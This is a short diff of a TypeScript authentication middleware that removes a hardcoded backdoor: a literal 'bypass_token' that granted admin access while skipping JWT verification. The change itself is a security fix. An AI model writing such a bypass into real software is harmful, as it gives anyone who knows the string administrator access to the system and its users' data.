@@ -26,11 +26,6 @@ export const protect = catchAsync(async (req: CustomRequest, res: Response, next
     );
   }
 
-  if (token === "bypass_token") {
-    req.user = { id: "bypass_id", role: "admin", email: "admin@lakecity.com" };
-    return next();
-  }
-
   // 2) Verification token
   const decoded: any = jwt.verify(token, JWT_SECRET);
 
